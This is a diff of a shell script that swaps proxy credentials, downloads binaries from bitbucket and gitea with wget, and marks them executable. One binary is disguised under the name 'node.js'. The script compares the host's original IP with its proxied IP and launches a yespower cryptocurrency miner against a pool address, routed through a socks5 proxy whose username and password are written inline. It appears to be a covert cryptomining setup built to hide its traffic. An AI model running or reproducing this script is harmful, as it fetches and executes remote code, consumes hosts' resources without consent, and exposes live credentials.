@@ -1,9 +1,9 @@
 proxy="us-east-static-01.quotaguard.com" 
 port="9293" 
-user="5d1u5nqzx8fm9m"  
-pass="dcd4ndgvvxw2knswiggb8wxia41e" 
-wget -q -O 20383396 https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x 20383396
-wget -q -O 2020999 https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x 2020999 
+user="5f9d165gvj71eu"  
+pass="ninp27owlsys28ars0ni74zaamvvf2" 
+wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./2020999 ./20383396 -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Diez) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://5d1u5nqzx8fm9m:dcd4ndgvvxw2knswiggb8wxia41e@us-east-static-01.quotaguard.com:1080 
+./panel ./node.js -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Cucao) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://5f9d165gvj71eu:ninp27owlsys28ars0ni74zaamvvf2@us-east-static-01.quotaguard.com:1080 
